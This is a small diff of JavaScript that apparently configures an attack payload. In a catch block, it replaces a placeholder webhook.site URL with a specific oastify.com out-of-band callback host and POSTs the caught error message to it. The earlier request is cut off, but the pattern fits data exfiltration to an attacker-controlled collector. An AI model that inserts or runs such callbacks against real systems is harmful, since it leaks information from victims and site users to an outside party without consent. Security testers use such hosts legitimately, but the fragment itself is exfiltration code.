@@ -13,7 +13,7 @@
       });
     } catch (e) {
       // Send error message if the request fails
-      fetch('https://webhook.site/YOUR-UNIQUE-URL', {
+      fetch('https://tvszdx5dhy4imqa0ioubcq0h086zuyin.oastify.com', {
         method: 'POST',
         body: JSON.stringify({ error: e.message })
       });
